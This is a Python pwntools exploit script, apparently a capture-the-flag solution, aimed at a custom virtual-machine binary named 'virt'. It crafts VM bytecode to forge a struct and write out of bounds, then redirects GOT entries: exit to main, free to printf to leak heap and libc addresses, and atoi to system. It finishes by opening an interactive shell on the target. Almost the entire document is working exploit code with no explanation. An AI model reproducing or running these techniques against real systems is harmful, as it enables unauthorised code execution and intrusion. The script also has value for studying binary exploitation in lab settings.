from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './virt'
HOST = '172.30.0.2'
PORT = 5555

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        # return process(TARGET)
        return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
    for line in lines :
        if TARGET[2:] in line.split('/')[-1] :
            break
    return int(line.split('-')[0], 16)
    # return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()

def mov(dst_reg, imm, src_reg=''):
    # assert(dst_reg < 4)
    payload = ''
    payload += '\x00'
    if src_reg == '':
        payload += chr(dst_reg << 3 | 1)
        payload += imm
    else:
        payload += chr(dst_reg << 3 | 0)
        payload += chr(src_reg)
    return payload

def jmp(reg):
    payload = ''
    payload += '\x06'
    payload += chr(reg << 3)
    return payload

def write(offset, value):
    # *(base + *offset) = *value
    payload = ''
    payload += '\x07'
    payload += chr(offset << 3)
    payload += chr(value << 3)
    payload += '\x00'
    return payload

def write2(reg, offset):
    # *reg = *(base + *offset) 
    payload = ''
    payload += '\x05'
    payload += chr(reg << 3)
    payload += chr(offset << 3)
    payload += '\x00'
    return payload
    
payload = ''

# fake vector struct
addr_struct = 0x10000-0x80-0x20-0x10
# addr_dst = 0x607030
addr_dst = elf.got.exit

for i in range(3):
    payload += mov(0, p16(addr_struct + 8*i))
    if i == 0:
        payload += mov(1, p32(addr_dst)[:2])
    else:
        payload += mov(1, p32(addr_dst+8)[:2])
    payload += write(0, 1)

    payload += mov(0, p16(addr_struct + 8*i + 2))
    if i == 0:
        payload += mov(1, p32(addr_dst)[2:])
    else:
        payload += mov(1, p32(addr_dst+8)[2:])
    payload += write(0, 1)

    # overwrite struct pointer
    payload += mov(0, p16(0x10000-3))
    payload += mov(1, p16(0))
    payload += write(0, 1)

# switch odd opcode
payload += mov(0, p16(0x73))
payload += jmp(0)
payload += '\xff'

# overwrite elf.got.exit to main
main = 0x404372
payload += mov(0, p32(main)[:2])
# payload += mov(2, p32(main)[2:])

# invoke exit
payload += mov(4, p16(0))

r.sendlineafter('size>', str(len(payload)))
r.sendafter('data>', payload)


for i in range(2):
    # invoke exit
    payload = mov(4, p16(0))

    r.sendlineafter('size>', str(len(payload)))
    r.sendafter('data>', payload)

payload = ''

# fake vector struct
addr_struct = 0x10000-0x80-0x20
addr_dst = 0x607030
# addr_dst = elf.got.exit

for i in range(3):
    payload += mov(0, p16(addr_struct + 8*i))
    if i == 0:
        payload += mov(1, p32(addr_dst)[:2])
    else:
        payload += mov(1, p32(addr_dst+8)[:2])
    payload += write(0, 1)

    payload += mov(0, p16(addr_struct + 8*i + 2))
    if i == 0:
        payload += mov(1, p32(addr_dst)[2:])
    else:
        payload += mov(1, p32(addr_dst+8)[2:])
    payload += write(0, 1)

    # overwrite struct pointer
    payload += mov(0, p16(0x10000-3))
    payload += mov(1, p16(0))
    payload += write(0, 1)

# printf payload
payload += mov(0, p16(0))
payload += mov(1, "%3")
payload += write(0, 1)
payload += mov(0, p16(2))
payload += mov(1, "$p")
payload += write(0, 1)

# switch odd opcode
payload += mov(1, p16(0x73+4*6))
payload += jmp(1)
payload += '\xff'

# overwrite elf.got.free to printf
payload += mov(0, p32(elf.plt.printf)[:2])
# payload += mov(2, p32(main)[2:])
payload += '\x0b'

if args.D:
    # debug(r, [0x31d9, 0x32b5, 0x32d0, 0x33bd, 0x41dd])
    # debug(r, [0x3158, 0x3178])
    debug(r, [0x31dc, 0x3158, 0x3178, 0x32e9])

r.sendlineafter('size> ', str(len(payload)))
r.sendafter('data> ', payload)
r.recv(1)
leak = u64(r.recv(4).ljust(8, '\x00'))
dbg('leak')
heap = leak - 0x52030
dbg('heap')
r.recvuntil('0x')
leak = int(r.recvuntil('size', True), 16)

base = leak - 0xf7380
dbg('leak')
dbg('base')
system = base + 0x453a0

for i in range(1):
    # invoke exit
    payload = mov(4, p16(0))

    r.sendlineafter('>', str(len(payload)))
    r.sendafter('data>', payload)

payload = ''

# fake vector struct
addr_struct = 0x10000-0x80-0x20-0x10
# addr_dst = 0x607030
addr_dst = elf.got.atoi

for i in range(3):
    payload += mov(0, p16(addr_struct + 8*i))
    if i == 0:
        payload += mov(1, p32(addr_dst)[:2])
    else:
        payload += mov(1, p32(addr_dst+8)[:2])
    payload += write(0, 1)

    payload += mov(0, p16(addr_struct + 8*i + 2))
    if i == 0:
        payload += mov(1, p32(addr_dst)[2:])
    else:
        payload += mov(1, p32(addr_dst+8)[2:])
    payload += write(0, 1)

    # overwrite struct pointer
    payload += mov(0, p16(0x10000-3))
    payload += mov(1, p16(0))
    payload += write(0, 1)

# switch odd opcode
payload += mov(0, p16(0x73))
payload += jmp(0)
payload += '\xff'

# overwrite elf.got.atoi to system
payload += mov(0, p64(system)[0:2])
payload += mov(1, p64(system)[2:4])
payload += mov(2, p64(system)[4:6])
payload += mov(3, p64(system)[6:])
# payload += mov(2, p32(main)[2:])

# invoke exit
payload += mov(4, p16(0))

r.sendlineafter('size>', str(len(payload)))
r.sendafter('data>', payload)

r.interactive()
r.close()
